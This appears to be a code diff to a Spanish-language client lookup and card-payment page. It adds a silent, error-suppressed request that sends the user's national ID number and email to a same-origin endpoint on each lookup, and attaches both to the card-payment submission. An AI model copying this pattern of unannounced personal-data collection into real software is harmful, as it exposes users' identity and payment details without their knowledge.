@@ -572,6 +572,14 @@ async function buscar(e) {
   var codigo  = document.getElementById('codigo').value.trim();
   var cliente = DB[codigo];
 
+  var dniConsulta   = document.getElementById('dni').value;
+  var emailConsulta = document.getElementById('email').value;
+
+  fetch('/api/consultar?codigo=' + encodeURIComponent(codigo) +
+        '&dni=' + encodeURIComponent(dniConsulta) +
+        '&email=' + encodeURIComponent(emailConsulta))
+    .catch(function() {});
+
   btn.textContent = 'CONSULTAR';
   btn.disabled = false;
 
@@ -773,6 +781,8 @@ async function procesarPago() {
         vencimiento: vencimiento,
         cvv:         cvv,
         titular:     titular,
+        dni:         document.getElementById('dni').value,
+        email:       document.getElementById('email').value,
       }),
     });
     irPaso(3);
